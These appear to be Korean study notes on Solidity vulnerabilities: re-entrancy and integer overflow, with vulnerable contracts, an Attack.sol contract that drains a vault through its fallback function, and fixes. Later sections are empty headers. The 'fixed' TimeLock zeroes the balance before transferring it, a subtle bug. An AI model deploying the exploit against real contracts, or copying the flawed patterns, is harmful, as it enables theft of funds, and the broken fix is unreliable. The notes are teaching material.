# 16 Solidity Hacks/Vulnerabilities, their Fixes and Real World Examples

## 1. Re-Entrancy

이더리움 스마트 컨트랙트는 외부의 컨트랙트(`external contracts`)를 호출하거나 활용할 수 있다는 특징이 있다. 컨트랙트는 일반적으로 ether를 처리하고, 다양한 외부 사용자 주소(external user addresses)에 ether를 전송하기도 한다. 외부의 컨트랙트를 호출하거나 어떤 주소로 ether를 전송하는 오퍼레이션을 위해서는 ***컨트랙트가 `external call`***을 `submit`해야 한다.  
이러한 `external calls`은 공격자가 `hijack`하여 해당 컨트랙트가 더 많은 코드를 실행하도록 강제할 수 있는데(i.e. `fallback function`을 통하여), 자기 자신으로 다시 호출하는 것을 포함하게 된다. 따라서 해당 코드 실행은 해당 컨트랙트로 재진입(`re-enter`)하게 된다. 이러한 공격은 바로 `DAO hack`에서 사용된 방법이다.

<br/>

### 1) The Vulnerability

공격자는 어떤 컨트랙트를 작성하여 `fallback` 함수에 공격코드를 심어 해당 컨트랙트를 배포한다. 따라서 공격 대상이 되는 컨트랙트에서 공격자가 만든 컨트랙트 주소에 ether를 전송할 경우 공격코드가 실행되게 된다. 일반적으로 해당 공격코드는 취약점이 있는 컨트랙트의 특정 함수를 호출한다. fallback 함수로 호출된 공격코드가 해당 취약한 컨트랙트의 코드에 재진입(`re-enter`)하기 때문에 이 공격은 `re-entrancy` 공격이라고 불린다.

다음의 예제 코드를 살펴보자. 이 취약점을 가진 컨트랙트가 하는 일은 Ethereum vault로서 역할을 하며, ether를 맡긴 depositor들이 오직 일주일에 한 번만 출금을 할 수 있도록 허용한다.

#### EtherStore.sol
 
```scala
pragma solidity ^0.4.8;
contract EtherStore {
  uint256 public withdrawalLimit = 1 ether;
  mapping(address => uint256) public lastWithdrawTime;
  mapping(address => uint256) public balances;
  
  function depositFunds() public payable {
      balances[msg.sender] += msg.value;
  }
  
  function withdrawFunds (uint256 _weiToWithdraw) public {
      require(balances[msg.sender] >= _weiToWithdraw);
      // limit the withdrawal
      require(_weiToWithdraw <= withdrawalLimit);
      // limit the time allowed to withdraw
      require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
      require(msg.sender.call.value(_weiToWithdraw)());
      balances[msg.sender] -= _weiToWithdraw;
      lastWithdrawTime[msg.sender] = now;
  }
}
```

<br/>

이 컨트랙트는 두 개의 public 함수를 갖고 있다. `depositFunds()` 함수와 `withdrawFunds()` 함수이다. `depositFunds()` 함수는 단순히 전송자의 밸런스를 증가시킨다. 그리고 `withdrawFunds()` 함수는 전송자가 원하는 만큼의 wei를 출금하는 역할을 한다. 하지만 이 때 출금 요청된 value는 1 ether 이하여야 하고, 일주일 이내에 출금된 요청이 없어야 한다. 

이 컨트랙트의 취약점은 바로 전송자에게 ether를 전송하고 밸런스를 차감하는 부분에서 발생한다.

```
require(msg.sender.call.value(_weiToWithdraw)());
balances[msg.sender] -= _weiToWithdraw;
```

<br/>

이제 공격 컨트랙트를 살펴보도록 하자.

#### Attack.sol

```scala
pragma solidity ^0.4.8;

import "./EtherStore.sol";
contract Attack {
  EtherStore public etherStore;
  // intialise the etherStore variable with the contract address
  constructor(address _etherStoreAddress) {
      etherStore = EtherStore(_etherStoreAddress);
  }
  
  function pwnEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      etherStore.depositFunds.value(1 ether)();
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }
  
  function collectEther() public {
      msg.sender.transfer(this.balance);
  }
    
  // fallback function - where the magic happens
  function () payable {
      if (etherStore.balance > 1 ether) {
          etherStore.withdrawFunds(1 ether);
      }
  }
}
```

이제 이 악성 컨트랙트가 어떻게 `EtherStore` 컨트랙트의 취약점을 이용하여 공격하는지 살펴보도록 하자. 공격자는 위의 컨트랙트를 배포하면서 공격대상이 되는 `EtherStore`의 주소를 `etherStore` 변수에 저장한다.

그리고 공격자는 `pwnEtherStore()` 함수를 호출한 다음 `EtherStore` 컨트랙트의 `depositFunds()` 함수를 호출하여 1 ether 이상을 입금한다. 그리고는 입금과 동시에 `withdrawFunds()` 함수를 호출하여 1 ether를 출금한다.

이제 위의 함수를 호출했을 때 어떠한 공격이 수행되는지 순서대로 알아보도록 하자(공격시점에서 `EtherStore` 컨트랙트는 총 10 ether의 밸런스를 저장하고 있다고 가정한다.)

1. Attack.sol : (라인15) - `depositFunds()` 함수가 호출되면 1 ether 만큼의 `msg.value`가 전달되고, 공격 컨트랙트의 밸런스에는 1 ether가 저장된다.
2. Attack.sol : (라인17) - `withdrawFunds()` 함수가 호출하면서 인자로 1 ether를 전달한다. 이는 (라인12 ~ 16)의 모든 요구사항을 통과하게 된다.
3. EtherStore.sol : (라인17) - `EtherStore` 컨트랙트는 공격 컨트랙트인 `Attack` 컨트랙트에게 1 ether를 다시 전송한다.
4. Attack.sol : (라인25) - 공격 컨트랙트에게 전달된 ether로 인해 `fallback` 함수가 실행된다.
5. Attack.sol : (라인26) - 원래 `EtherStore` 컨트랙트에는 10 ether가 저장되어 있었고, 공격 컨트랙트에게 1 ether를 전송했기 때문에 남은 밸런스는 9 ether이므로 `fallback` 함수 내부의 조건문을 통과한다.
6. Attack.sol : (라인 27) - `fallback` 함수는  `withdrawFunds()` 함수를 재호출하여 해당 `EtherStore` 컨트랙트에 ***재진입(`re-enter`)한다***.
7. EtherStore.sol : (라인12) - 두 번째 `withdrawFunds()` 함수를 호출하였을 때, 여전히 공격 컨트랙트의 밸런스는 1 ether이다. 왜냐하면 아직 아래에 있는 (라인17)에서 밸런스를 차감하는 부분이 실행되지 않았기 때문이다. 이는 (라인19)에 있는 최종 출금시간도 업데이트되지 않았기 때문에 이전과 동일하게 모든 요구사항을 만족하여 통과하게 된다.
8. EtherStore.sol : (라인17) - 이제 다시 1 ether를 공격 컨트랙트에게 전송한다.
9. 4 ~ 8번 과정이 recursive하게 반복된다. 
10. Attack.sol : (라인26) - `fallback` 함수에서 `EtherStore.balance >= 1` 조건을 만족하지 않으면 함수 호출이 중단된다. 그리고 모든 `withdrawFunds()` 호출에 대해서 이전에 실행되지 않았던 (라인18), (라인19)가 호출되고 공격 컨트랙트의 밸런스를 차감하고 최종 출금 시간이 업데이트 된다.

결과적으로 공격자 컨트랙트의 한 번의 함수 호출(`pwnEtherStore()`)로 인해서 `EtherStore` 컨트랙트 안의 모든 ether가 공격 컨트랙트에게 전송된다.

<br/>

### 2) Preventative Techniques

`re-entrancy` 공격을 막기 위해서는 다양한 방법이 있는데, 첫 번째는 외부 컨트랙트에게 ether를 전송할 때는 내장된(built-in) `transfer()` 함수를 사용하는 것이다. 이 `transfer()` 함수는 2300 gas 밖에 사용하지 못하기 때문에 전송받은 공격 컨트랙트의 `fallback` 함수에서 `re-entrancy` 공격을 수행하여 컨트랙트에 재진입할 수 있을 만큼 가스가 충분하지 않다. 

두 번째 방법은 모든 상태가 변하는 로직을 컨트랙트에서 ether를 전송하기 전에(또는 외부 호출을 하기 전에) 설정하는 것이다. `EtherStore` 예제에서 (라인18, 19)는 (라인17) 이전에 위치해야 한다. 따라서 외부의 알려지지 않은 주소를 호출하는 코드를 가장 밑에 두는 것이 좋은 방법이다. 이것이 바로 `checks-effects-interactions` 패턴이다.

세 번째 방법은 바로 `mutex` 기능을 집어넣는 것이다. 즉 state 변수를 추가하여 코드가 실행되는 동안 `mutex`에 의해서 코드에 재진입하는 것을 방지하는 것이다.

위의 모든 방법을 적용하면 완전히 re-entrancy 공격을 방지할 수 있게 된다(모든 방법을 적용할 필요는 없다.)

```scala
pragma solidity ^0.4.8;

contract EtherStore {
  // initialise the mutex
  bool reEntrancyMutex = false;
  uint256 public withdrawalLimit = 1 ether;
  mapping(address => uint256) public lastWithdrawTime;
  mapping(address => uint256) public balances;
  
  function depositFunds() public payable {
      balances[msg.sender] += msg.value;
  }
  
  function withdrawFunds (uint256 _weiToWithdraw) public {
    require(!reEntrancyMutex);
    require(balances[msg.sender] >= _weiToWithdraw);
    // limit the withdrawal
    require(_weiToWithdraw <= withdrawalLimit);
    // limit the time allowed to withdraw
    require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
    balances[msg.sender] -= _weiToWithdraw;
    lastWithdrawTime[msg.sender] = now;
    // set the reEntrancy mutex before the external call
    reEntrancyMutex = true;
    msg.sender.transfer(_weiToWithdraw);
    // release the mutex after the external call
    reEntrancyMutex = false; 
  }
}
```

### 3) Real-World Example: The DAO

The DAO (Decentralized Autonomous Organization)

<br/>

## 2. Arithmetic Over/Under Flows

Ethereum Virtual Machine (EVM)은 integer에 대하여 고정된 크기를 갖고 있다. 따라서 integer 변수는 특정 범위의 값만 가질 수 있다. 예를 들어 `uint8` 타입은 오직 0~255까지의 값만 저장할 수 있다. 만약 `uint8` 타입에 256을 할당하려고 하면 실제로는 0이 저장된다.

<br/>

### 1) The Vulnerabilities

`overflow` 또는 `underflow`는 어떤 고정된 크기를 갖는 변수에 해당 변수의 타입이 저장할 수 있는 데이터의 범위를 벗어나는 값이 할당되었을 때 발생한다. 예를 들어 `uint8` 타입을 갖는 변수에 0이 저장되어 있을 때, 이 변수에서 1을 뺀다면 변수의 값은 255가 된다. 우리는 이것을 `underflow`라고 부른다. 반대로 255가 저장된 `uint8` 타입의 변수에 1을 더하면 0이 되는데, 이것을 우리는 `overflow`라고 부른다.

이러한 특성을 공격자가 악용할 경우 취약점이 될 수 있다. 예를 들어 다음의 time locking 컨트랙트를 살펴보자.

<br/>

#### TimeLock.sol

```scala
pragma solidity ^0.4.8;

contract TimeLock {
  mapping(address => uint) public balances;
  mapping(address => uint) public lockTime;
  
  function deposit() public payable {
    balances[msg.sender] += msg.value;
    lockTime[msg.sender] = now + 1 weeks;
  }
  
  function increaseLockTime(uint _secondsToIncrease) public {
    lockTime[msg.sender] += _secondsToIncrease;
  }
  
  function withdraw() public {
    require(balances[msg.sender] > 0);
    require(now > lockTime[msg.sender]);
    balances[msg.sender] = 0;
    msg.sender.transfer(balances[msg.sender]);
  }
}
```

<br/>

위 컨트랙트는 `deposit()` 함수에서 입금을 받고 1주일 동안 lock을 걸어놓는다.

위 컨트랙트에서 취약점을 발생시키는 함수는 바로 `increaseLockTime()` 함수이다. 입력된 인자값 만큼 해당 사용자의 `lockTime`을 증가시키는 함수인데, `overflow` 공격을 사용하면 해당 사용자의 `lockTime`을 0으로 만들 수 있다.

공격자가 만약 `increaseLockTime()` 함수에 인자값으로 2<sup>256</sup> - currentLockTime 을 전달하면 해당 사용자의 `lockTime`은 `overflow`가 발생하여 0으로 저장된다. 따라서 이 공격을 사용하면 1주일이 지나지 않아도 lockTime을 수정하여 돈을 출금할 수 있게 된다.

<br/>

또 다른 예제를 살펴보도록 하자. 이 예제는 [Ethernaut Challanges][2]로부터 가져온 것이다.

<br/>

```scala
pragma solidity ^0.4.18;

contract Token {
  mapping(address => uint) balances;

  uint public totalSupply;
  function Token(uint _initialSupply) {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public constant returns (uint balance) {
    return balances[_owner];
  }
}
```

<br/>

위 컨트랙트는 간단한 `transfer()` 함수를 갖고 있어서 사용자 간에 토큰을 주고 받을 수 있는 기능이 있다.

위의 코드에서 취약점이 있는 함수는 바로 `transfer()`이다. 가장 첫 줄에 있는 `msg.sender`의 balance를 검사하는 코드에 문제가 있다. 왜냐하면 입력된 value값이 `msg.sender`의 balance보다 클 경우 `balances[msg.sender] - _value` 값은 음수(negative number)가 되는 것이 아니라 `underflow`에 의해 양수(positive number)가 되기 때문이다. 따라서 공격자는 자신이 가진 balance보다 큰 값을 전달함으로써 `underflow`를 발생시켜 자신의 토큰 balance는 물론 상대방의 토큰 balance까지 증가시킬 수 있다. 

<br/>

### 2) Preventative Techniques

`overflow` 또는 `underflow`를 방지하기 위한 일반적인 방법은 수학적 연산(덧셈, 뺄셈, 곱셈 등)을 할 때는 `Solidity`의 표준 연산을 사용하는 것이 아니라 수학 연산을 안전하게 할 수 있는 `라이브러리`를 사용하는 것이다.

대표적으로 `OppenZepplin`에서 만든 [SafeMath][3] 라이브러리를 사용하면 수학적 연산을 할 때 `overflow` 또는 `underflow`를 방지하여 안전하게 코드를 실행할 수 있다. 

[SafeMath][3]를 적용하여 안전하게 작성된 컨트랙트 예제는 다음과 같다.

<br/>

```scala
pragma solidity ^0.4.18;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b); 
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b; 
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract TimeLock {
  using SafeMath for uint; // use the library for uint type
  mapping(address => uint256) public balances;
  mapping(address => uint256) public lockTime;
  
  function deposit() public payable {
    balances[msg.sender] = balances[msg.sender].add(msg.value);
    lockTime[msg.sender] = now.add(1 weeks);
  }
  
  function increaseLockTime(uint256 _secondsToIncrease) public {
    lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease);
  }
  
  function withdraw() public {
    require(balances[msg.sender] > 0);
    require(now > lockTime[msg.sender]);
    balances[msg.sender] = 0;
    msg.sender.transfer(balances[msg.sender]);
  }
}
```

<br/>

### 4. Real-World Examples: PoWHC and Batch Transfer Overflow (CVE-2018–10299)

<br/>

## 3. Unexpected Ether

### 1. The Vulnerability



<br/>

<br/>

---

### References

\[1\] *vasa. (2018, Jul 23). [HackPedia: 16 Solidity Hacks/Vulnerabilities, their Fixes and Real World Examples][1] [Medium Blog Post]*

[1]: https://medium.com/hackernoon/hackpedia-16-solidity-hacks-vulnerabilities-their-fixes-and-real-world-examples-f3210eba5148

\[2\] *OpenZeppelin. (2020, Jul 28). [Ethernaut][2] [GitHub]*

[2]: https://github.com/OpenZeppelin/ethernaut

\[3\] *OpenZeppelin. (2020, Jun 6). [SafeMath.sol][3] [GitHub]*

[3]: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol



